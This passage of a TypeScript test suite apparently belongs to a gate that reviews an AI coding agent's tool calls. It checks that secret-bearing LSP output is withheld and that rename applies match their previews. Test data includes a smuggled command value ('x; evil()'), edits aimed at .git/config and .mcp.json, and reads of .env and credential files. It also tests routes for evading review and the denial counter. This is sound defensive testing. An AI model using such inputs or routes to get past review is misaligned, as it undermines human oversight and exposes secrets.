      { action: "capabilities", file: "*" },
      { action: "code_actions", file: "*" },
      { action: "rename_file", file, new_name: "*", apply: false },
      // Fields and values outside the tool's schema.
      { action: "hover", file, payload: "{}" },
      { action: "hover", file, extra: true },
      { action: "rename", file, new_name: "y", apply: "false" },
      { action: "HOVER", file },
      { file },
      "hover",
    ];
    for (const input of reviewed) {
      assert.equal(route(input), null, JSON.stringify(input));
    }

    assert.equal(route({ path: "xd://lsp", content: '{"action":"rename","new_name":"y"}' }, "write"), "lsp_dispatch");
    for (const input of [
      { path: "xd://bash", content: '{"command":"id"}' },
      { path: "xd://lsp/", content: "{}" },
      { path: "XD://lsp", content: "{}" },
      { path: "xd://lsp", content: {} },
      { path: "xd://lsp", content: "{}", file_path: "notes.txt" },
    ]) {
      assert.equal(route(input, "write"), null, JSON.stringify(input));
    }
    assert.equal(route({ path: "xd://lsp", content: "{}" }, "edit"), null);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("lsp results that show source lines from unreadable files are withheld", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-callgate-lsp-result-"));
  const workspace = join(root, "workspace");
  const library = join(root, "library");
  mkdirSync(join(workspace, "src"), { recursive: true });
  mkdirSync(library);
  try {
    const roots = resolveReadRoots(workspace, [library]);
    const text = (...lines: string[]) => [{ type: "text", text: lines.join("\n") }];
    const check = (content: unknown) => unreadableLspLocation(content, roots);
    // OMP's own output, as printed for definition and references.
    assert.equal(
      check(text("Found 1 definition(s):", "  src/a.ts:1:14", "    1: export const x = 1;", "    2: ")),
      null,
    );
    assert.equal(
      check(text("Found 1 definition(s):", `  ${join(library, "b.ts")}:3:1`, "    2: a", "    3: b", "    4: c")),
      null,
    );
    const outside = join(root, "secret.ts");
    assert.equal(
      check(text("Found 1 definition(s):", `  ${outside}:1:14`, '    1: export const TOKEN = "sk";')),
      outside,
    );
    assert.equal(
      check(text("Found 2 reference(s):", "  src/a.ts:1:1", "    1: x", "  .env:2:1", "    2: KEY=v")),
      ".env",
    );
    // A location without source lines shows only a path and position.
    assert.equal(check(text("Found 1 reference(s):", `  ${outside}:4:2`)), null);
    // A symbol list's `name @ path` never vouches for source lines.
    assert.equal(check(text("  Constant x @ src/a.ts:1:1", "    1: x")), "Constant x @ src/a.ts");
    assert.equal(check(text("  src/a.ts:2:1", "    1: a", "    2:", "    3: c")), null);
    // Source lines need a readable location right above them.
    assert.equal(check(text("    1: KEY=v")), "(source lines under no location)");
    assert.equal(
      check(text("  src/a.ts:1:1", "    1: x", "Found 1 more:", "    7: KEY=v")),
      "(source lines under no location)",
    );
    // Paths and names without source lines are let through.
    assert.equal(check(text(`Found 1 symbol(s) matching "TOKEN":`, `  Constant TOKEN @ ${outside}:1:14`)), null);
    assert.equal(check(text("Rename preview:", `  ${outside}: 2 edits`)), null);
    assert.equal(check(text("```typescript", 'const TOKEN: "sk"', "```")), null);
    assert.equal(check([{ type: "image", data: "" }, ...text("  src/a.ts:1:1", "    1: x")]), null);
    assert.equal(check("not a list"), null);

    const withheld = await reviewToolResult(
      { toolName: "lsp", input: { action: "definition" }, content: text(`  ${outside}:1:14`, "    1: s") },
      ctx({ cwd: workspace }),
      config({ readRoots: [library] }),
      { store: new SessionApprovalStore(), protectedFiles: [] },
    );
    assert.ok(withheld);
    assert.equal(withheld.isError, true);
    assert.match(
      JSON.stringify(withheld.content[0]),
      /withheld this lsp result: it shows source lines from .*secret\.ts/,
    );
    assert.equal(
      await reviewToolResult(
        { toolName: "read", content: text(`  ${outside}:1:14`, "    1: s") },
        ctx({ cwd: workspace }),
        config(),
        { store: new SessionApprovalStore(), protectedFiles: [] },
      ),
      undefined,
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("lsp edit previews are read strictly, and applies are matched against them", () => {
  const ok = (path: string) => path.startsWith("src/");
  const lines = (...parts: string[]) => parts.join("\n");
  assert.deepEqual(
    cleanPreviewFiles("rename", lines("Rename preview:", "  src/a.ts: 2 edits", "  src/b.ts: 1 edit"), ok),
    new Map([
      ["src/a.ts", 2],
      ["src/b.ts", 1],
    ]),
  );
  for (const preview of [
    lines("Rename preview:", "  src/a.ts: 2 edits", "  /elsewhere/c.ts: 1 edit"),
    lines("Rename preview:", "  src/a.ts: 2 edits", "  CREATE: src/new.ts"),
    lines("Rename preview:", "  DELETE: src/a.ts"),
    lines("Rename preview:"),
    lines("Rename returned no edits"),
    lines("Rename preview:", "  src/a.ts: 2 edits", "  something new"),
  ]) {
    assert.equal(cleanPreviewFiles("rename", preview, ok), null, preview);
  }
  assert.deepEqual(
    cleanPreviewFiles(
      "rename_file",
      lines(
        "Rename preview: src/a.ts → src/b.ts",
        "  typescript-language-server:",
        "    src/c.ts: 1 edit",
        "  eslint:",
        "    src/c.ts: 2 edits",
      ),
      ok,
    ),
    new Map([["src/c.ts", 3]]),
  );
  assert.deepEqual(
    cleanPreviewFiles(
      "rename_file",
      lines("Rename preview: src/a.ts → src/b.ts", "  No LSP edits would be applied"),
      ok,
    ),
    new Map(),
  );
  for (const preview of [
    lines("Rename preview: 2 files under src/d → src/e", "  No LSP edits would be applied"),
    lines("Rename preview: 1 file under src/d → src/e", "  No LSP edits would be applied"),
    lines("Rename preview: src/a.ts → src/b.ts", "  ts:", "    lib/c.ts: 1 edit"),
    lines("Rename preview: src/a.ts → src/b.ts", "  Server notes:", "  ts: failed"),
  ]) {
    assert.equal(cleanPreviewFiles("rename_file", preview, ok), null, preview);
  }

  const previewed = new Map([
    ["src/a.ts", 2],
    ["src/c.ts", 1],
  ]);
  const mismatch = (action: string, text: string, isError = false) =>
    appliedEditMismatch(action, text, isError, previewed);
  assert.equal(mismatch("rename", lines("Applied rename:", "  Applied 2 edit(s) to src/a.ts")), null);
  // OMP changed nothing.
  for (const text of ["Rename returned no edits", "Error: new_name parameter required for rename"]) {
    assert.equal(mismatch("rename", text), null, text);
  }
  assert.equal(mismatch("rename", "No language server found for this action"), null);
  // Files the preview did not list, other changes, and results this cannot read.
  assert.equal(
    mismatch("rename", lines("Applied rename:", "  Applied 1 edit(s) to src/b.ts")),
    "  Applied 1 edit(s) to src/b.ts",
  );
  assert.equal(mismatch("rename", lines("Applied rename:", "  Created src/a.ts")), "  Created src/a.ts");
  // More edits than the preview counted: the server answered differently.
  assert.equal(
    mismatch("rename", lines("Applied rename:", "  Applied 40 edit(s) to src/a.ts")),
    "  Applied 40 edit(s) to src/a.ts",
  );
  assert.equal(mismatch("rename", lines("Applied rename:", "  Applied 1 edit(s) to src/a.ts")), null);
  assert.equal(mismatch("rename", "LSP error: write failed"), "LSP error: write failed");
  assert.equal(mismatch("rename", "Renamed it all"), "Renamed it all");
  assert.equal(
    mismatch("rename", "LSP rename timed out after 30s", true),
    "the apply failed: LSP rename timed out after 30s",
  );

  const moved = (...more: string[]) =>
    lines("Renamed src/x.ts → src/y.ts", ...more, "  Renamed src/x.ts → src/y.ts", "  Server notes:", "  ts: late");
  assert.equal(
    mismatch(
      "rename_file",
      moved("  ts: applied 1 edit(s) to src/c.ts", "    note: discarded 1 overlapping edit(s) from b (kept ts)"),
    ),
    null,
  );
  assert.equal(mismatch("rename_file", lines("Renamed src/x.ts → src/y.ts", "  Renamed src/x.ts → src/y.ts")), null);
  assert.equal(
    mismatch("rename_file", moved("  ts: applied 1 edit(s) to ../other/z.ts")),
    "  ts: applied 1 edit(s) to ../other/z.ts",
  );
  // The move must be the call's own, once.
  assert.equal(
    mismatch("rename_file", lines("Renamed src/x.ts → src/y.ts", "  Renamed src/run.ts → bin/run")),
    "  Renamed src/run.ts → bin/run",
  );
  assert.equal(
    mismatch("rename_file", lines("Renamed src/x.ts → src/y.ts")),
    "Renamed src/x.ts → src/y.ts (no move line)",
  );
  assert.equal(
    mismatch(
      "rename_file",
      lines(
        "Renamed src/x.ts → src/y.ts",
        "  Renamed src/x.ts → src/y.ts",
        "  Server notes:",
        "  ts: applied 1 edit(s) to src/b.ts",
      ),
    ),
    "  ts: applied 1 edit(s) to src/b.ts",
  );
  // A server note spanning lines, or anything else after the notes heading.
  assert.equal(
    mismatch(
      "rename_file",
      lines(
        "Renamed src/x.ts → src/y.ts",
        "  Renamed src/x.ts → src/y.ts",
        "  Server notes:",
        "    also changed ../z.ts",
      ),
    ),
    "    also changed ../z.ts",
  );
});

await test("an lsp edit that repeats a clean preview skips review once", async () => {
  const workspace = mkdtempSync(join(tmpdir(), "omp-callgate-lsp-edit-"));
  mkdirSync(join(workspace, "src"));
  writeFileSync(join(workspace, "src", "a.ts"), "export const oldName = 1;\n");
  writeFileSync(join(workspace, "src", "tool.js"), "#!/usr/bin/env node\n");
  chmodSync(join(workspace, "src", "tool.js"), 0o755);
  writeFileSync(join(workspace, "src", "script.txt"), "#!/bin/sh\necho hi\n");
  mkdirSync(join(workspace, "src", "dir"));
  try {
    // The checks on the apply call itself.
    const apply = (input: Record<string, unknown>) =>
      isLspEditApply({ action: "rename", file: "src/a.ts", line: 1, symbol: "oldName", ...input }, workspace, []);
    assert.equal(apply({ new_name: "newName" }), true);
    assert.equal(apply({ new_name: "$näme_2", apply: true }), true);
    assert.equal(apply({ new_name: "x; evil()" }), false);
    assert.equal(apply({ new_name: "2x" }), false);
    assert.equal(apply({ new_name: "y", apply: false }), false);
    assert.equal(apply({ new_name: "y", payload: "{}" }), false);
    assert.equal(apply({ new_name: "y", file: ".git/config" }), false);
    const move = (file: string, newName: string) =>
      isLspEditApply({ action: "rename_file", file, new_name: newName }, workspace, []);
    assert.equal(move("src/a.ts", "src/b.ts"), true);
    assert.equal(move("src/a.ts", ".mcp.json"), false);
    assert.equal(move("src/a.ts", "../b.ts"), false);
    assert.equal(move("src/tool.js", "src/tool2.js"), false);
    assert.equal(move("src/script.txt", "src/run"), false);
    assert.equal(move("src/dir", "src/dir2"), false);
    assert.equal(move("src/missing.ts", "src/b.ts"), false);

    // The whole flow, as OMP reports it.
    const store = new SessionApprovalStore();
    const notices: string[] = [];
    let session = "s1";
    let jobs = 0;
    const context = () =>
      ctx({
        cwd: workspace,
        ui: { notify: (message: string) => notices.push(message) },
        sessionManager: { getBranch: () => [], getSessionId: () => session },
        runningJobCount: () => jobs,
      });
    const cfg = config({ reviewer: "ai", maxConsecutiveDenials: 100 });
    const rename = { action: "rename", file: "src/a.ts", line: 1, symbol: "oldName", new_name: "newName" };
    const preview = { ...rename, apply: false };
    let calls = 0;
    const result = (input: unknown, toolCallId: string, ...text: string[]) =>
      reviewToolResult(
        { toolName: "lsp", toolCallId, input, content: [{ type: "text", text: text.join("\n") }] },
        context(),
        cfg,
        { store, protectedFiles: [] },
      );
    // OMP decides a preview, then runs it and reports its result under the same id.
    const decided = (input: unknown, classifier = false, toolName = "lsp", toolCallId = `c${(calls += 1)}`) =>
      evaluateToolCall(
        { toolName, input, toolCallId },
        context(),
        cfg,
        store,
        classifier
          ? classifierDenyOptions()
          : {
              classifierClient: async () => {
                throw new Error("this call should skip review");
              },
            },
      );
    const decide = (input: unknown, classifier = false, toolName = "lsp") => decided(input, classifier, toolName);
    const previewed = async (input: unknown = preview, ...text: string[]) => {
      assert.deepEqual(await decided(input, false, "lsp", "p"), {});
      return result(input, "p", ...(text.length ? text : ["Rename preview:", "  src/a.ts: 2 edits"]));
    };
    // An apply's result as OMP reports it, matching the preview.
    const applied = (input: unknown = rename) =>
      result(input, `c${calls}`, "Applied rename:", "  Applied 2 edit(s) to src/a.ts");
    const denied = { block: true, reason: CLASSIFIER_DENY_REASON };

    // No preview yet: reviewed.
    assert.deepEqual(await decide(rename, true), denied);
    // A clean preview: the agent is told, and the same apply skips review once.
    assert.match(JSON.stringify((await previewed())?.content), /skips review once/);
    assert.deepEqual(await decide({ ...rename, apply: true }), {});
    await applied({ ...rename, apply: true });
    assert.deepEqual(await decide(rename, true), denied);
    // Other arguments than the preview's are reviewed.
    await previewed();
    assert.deepEqual(await decide({ ...rename, new_name: "other" }, true), denied);
    // A write in between can change what the same arguments mean.
    await previewed();
    assert.deepEqual(await decide({ path: "src/a.ts", content: "x" }, false, "write"), {});
    await result({ path: "src/a.ts" }, `c${calls}`, "ok");
    assert.deepEqual(await decide(rename, true), denied);
    // A batch: the preview is decided, then a write is decided before the
    // preview's result comes back. The preview may show the code before or
    // after the write, so it does not count.
    assert.deepEqual(await decided(preview, false, "lsp", "p"), {});
    assert.deepEqual(await decided({ path: "src/a.ts", content: "x" }, false, "write", "w1"), {});
    assert.equal(await result(preview, "p", "Rename preview:", "  src/a.ts: 2 edits"), undefined);
    assert.deepEqual(await decide(rename, true), denied);
    // While that write is still running, a new preview does not count either.
    assert.equal(await previewed(), undefined);
    assert.deepEqual(await decide(rename, true), denied);
    // Once its result is back, it does.
    await result({ path: "src/a.ts" }, "w1", "ok");
    await previewed();
    assert.deepEqual(await decide(rename), {});
    await applied();
    // Background jobs could change files at any time.
    await previewed();
    jobs = 1;
    assert.deepEqual(await decide(rename, true), denied);
    assert.equal(await previewed(), undefined);
    jobs = 0;
    assert.deepEqual(await decide(rename, true), denied);
    // A job that starts while the preview runs: no promise to the agent.
    assert.deepEqual(await decided(preview, false, "lsp", "p"), {});
    jobs = 1;
    assert.equal(await result(preview, "p", "Rename preview:", "  src/a.ts: 2 edits"), undefined);
    jobs = 0;
    // A withheld preview is not usable, and an earlier one of the same call goes too.
    await previewed();
    const withheld = await previewed(preview, "Rename preview:", `  ${join(tmpdir(), "x.ts")}:1:1`, "    1: secret");
    assert.equal(withheld?.isError, true);
    assert.deepEqual(await decide(rename, true), denied);
    // Lookups in between change nothing.
    await previewed();
    assert.deepEqual(await decide({ action: "hover", file: "src/a.ts", line: 1 }), {});
    assert.deepEqual(await decide(rename), {});
    await applied();
    // A preview naming a file outside the workspace is not usable, and forgets the earlier one.
    await previewed();
    assert.equal(await previewed(preview, "Rename preview:", "  ../b.ts: 1 edit"), undefined);
    assert.deepEqual(await decide(rename, true), denied);
    // A new name the apply would not accept: no note, and the apply is reviewed.
    const dotted = { ...preview, new_name: "a.b" };
    assert.equal(await previewed(dotted), undefined);
    assert.deepEqual(await decide({ ...dotted, apply: true }, true), denied);
    // A preview counts only in its own session.
    await previewed();
    session = "s2";
    assert.deepEqual(await decide(rename, true), denied);
    session = "s1";

    // The apply's result matches its preview: nothing happens.
    await previewed();
    assert.deepEqual(await decide(rename), {});
    await applied();
    assert.deepEqual(notices, []);
    // It changes another file: the user is told, and edits are reviewed from then on, even after a restart.
    await previewed();
    assert.deepEqual(await decide(rename), {});
    await result(
      rename,
      `c${calls}`,
      "Applied rename:",
      "  Applied 2 edit(s) to src/a.ts",
      "  Applied 1 edit(s) to ../b.ts",
    );
    assert.match(notices.join("\n"), /changed more than its preview showed/);
    store.clear();
    assert.equal(await previewed(), undefined);
    assert.deepEqual(await decide(rename, true), denied);
  } finally {
    rmSync(workspace, { recursive: true, force: true });
  }
});

await test("letting write xd://lsp through does not reset the denial count", async () => {
  for (const cfg of [
    config({ reviewer: "ai", maxConsecutiveDenials: 5 }),
    // Exempting write lets it through by another route; that must not reset the count either.
    config({ reviewer: "ai", maxConsecutiveDenials: 5, reviewExemptTools: ["write"] }),
  ]) {
    const store = new SessionApprovalStore();
    const dispatch = { toolName: "write", input: { path: "xd://lsp", content: '{"action":"reload"}' } };
    const inner = { toolName: "lsp", input: { action: "reload" } };
    for (let round = 1; round <= 2; round += 1) {
      assert.deepEqual(await evaluateToolCall(dispatch, ctx(), cfg, store, classifierDenyOptions()), {});
      const denied = await evaluateToolCall(inner, ctx(), cfg, store, classifierDenyOptions());
      assert.deepEqual(denied, { block: true, reason: CLASSIFIER_DENY_REASON });
      assert.equal(store.consecutiveDenialCount, round);
    }
  }
});

await test("readRoots extend the read fast path without exposing secrets", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-callgate-roots-"));
  const workspace = join(root, "workspace");
  const library = join(root, "library");
  const sibling = join(root, "sibling");
  mkdirSync(workspace);
  mkdirSync(join(library, "pkg"), { recursive: true });
  mkdirSync(sibling);
  const cfg = config({ reviewer: "ai", readRoots: [library, "relative/ignored"] });
  const evaluate = (input: unknown) =>
    evaluateToolCall(
      { toolName: "read", input },
      ctx({ cwd: workspace }),
      cfg,
      new SessionApprovalStore(),
      classifierDenyOptions(),
    );
  try {
    assert.deepEqual(await evaluate({ path: join(library, "pkg", "lib.rs") }), {});
    assert.deepEqual(await evaluate({ path: "../library/pkg/lib.rs:10-20" }), {});
    for (const path of [
      join(library, "pkg", ".env"),
      join(library, "credentials.toml"),
      join(sibling, "x.txt"),
      "../sibling/../library/../sibling/x.txt",
    ]) {
      assert.deepEqual(await evaluate({ path }), { block: true, reason: CLASSIFIER_DENY_REASON }, path);
    }
    const home = await evaluateToolCall(
      { toolName: "read", input: { path: "~/.cargo/registry/src/lib.rs" } },
      ctx({ cwd: workspace }),
      config({ reviewer: "ai", readRoots: ["~/.cargo/registry"] }),
      new SessionApprovalStore(),
      {
        classifierClient: async () => {
          throw new Error("home read root must not call classifier");
        },
      },
    );
    assert.deepEqual(home, {});
    assert.deepEqual(resolveReadRoots(workspace, [library, "relative/ignored", " ~/x "]).extra, [
      library,
      join(homedir(), "x"),
    ]);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("write fast path applies only to the host's own write and edit tools", async () => {
  const workspace = mkdtempSync(join(tmpdir(), "omp-callgate-write-source-"));
  try {
    for (const [source, expectReview] of [
      ["builtin", false],
      ["extension", true],
      ["mcp", true],
    ] as const) {
      const result = await evaluateToolCall(
        { toolName: "write", input: { path: "notes.txt" } },
        ctx({ cwd: workspace }),
        config({ reviewer: "ai" }),
        new SessionApprovalStore(),
        { tools: [{ name: "write", sourceInfo: { source } }], ...classifierDenyOptions() },
      );
      assert.deepEqual(result, expectReview ? { block: true, reason: CLASSIFIER_DENY_REASON } : {}, source);
    }
  } finally {
    rmSync(workspace, { recursive: true, force: true });
  }
});
